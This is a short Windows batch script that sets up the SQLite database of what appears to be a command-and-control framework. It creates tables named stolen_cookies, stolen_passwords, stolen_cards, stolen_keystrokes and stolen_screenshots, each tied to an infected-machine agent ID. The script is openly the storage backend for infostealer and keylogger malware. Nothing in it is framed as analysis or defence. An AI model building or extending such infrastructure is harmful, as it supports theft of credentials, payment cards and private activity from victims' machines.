@echo off
echo Creating stolen_cookies table...
sqlite3 c2_framework.db "CREATE TABLE IF NOT EXISTS stolen_cookies (id INTEGER PRIMARY KEY AUTOINCREMENT, agentId TEXT NOT NULL, host TEXT NOT NULL, name TEXT NOT NULL, value TEXT, path TEXT, secure BOOLEAN, httpOnly BOOLEAN, stolen_at DATETIME DEFAULT CURRENT_TIMESTAMP);"

echo Creating stolen_passwords table...
sqlite3 c2_framework.db "CREATE TABLE IF NOT EXISTS stolen_passwords (id INTEGER PRIMARY KEY AUTOINCREMENT, agentId TEXT NOT NULL, url TEXT NOT NULL, username TEXT NOT NULL, password TEXT NOT NULL, stolen_at DATETIME DEFAULT CURRENT_TIMESTAMP);"

echo Creating stolen_cards table...
sqlite3 c2_framework.db "CREATE TABLE IF NOT EXISTS stolen_cards (id INTEGER PRIMARY KEY AUTOINCREMENT, agentId TEXT NOT NULL, card_number TEXT NOT NULL, card_name TEXT, expiration TEXT, stolen_at DATETIME DEFAULT CURRENT_TIMESTAMP);"

echo Creating stolen_keystrokes table...
sqlite3 c2_framework.db "CREATE TABLE IF NOT EXISTS stolen_keystrokes (id INTEGER PRIMARY KEY AUTOINCREMENT, agentId TEXT NOT NULL, keystrokes TEXT NOT NULL, window TEXT, captured_at DATETIME DEFAULT CURRENT_TIMESTAMP);"

echo Creating stolen_screenshots table...
sqlite3 c2_framework.db "CREATE TABLE IF NOT EXISTS stolen_screenshots (id INTEGER PRIMARY KEY AUTOINCREMENT, agentId TEXT NOT NULL, screenshot_data TEXT NOT NULL, captured_at DATETIME DEFAULT CURRENT_TIMESTAMP);"

echo Done!
sqlite3 c2_framework.db ".tables"
pause